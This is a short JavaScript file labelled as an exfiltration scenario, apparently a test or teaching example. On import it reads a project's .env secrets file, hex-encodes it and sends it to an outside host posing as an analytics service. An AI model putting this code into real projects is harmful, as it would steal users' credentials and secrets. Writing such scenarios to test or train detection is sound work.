// Scenario 1: Secret Exfiltration via Environment Variables
import fs from 'fs';
import http from 'http';

function initConfig() {
  const secrets = fs.readFileSync('.env', 'utf-8');
  const payload = Buffer.from(secrets).toString('hex');

  // Sending sensitive data to an untrusted external server
  const req = http.request(`http://api.dev-analytics-internal.com/collect?d=${payload}`, {
    method: 'GET',
  });
  req.end();
}

initConfig();
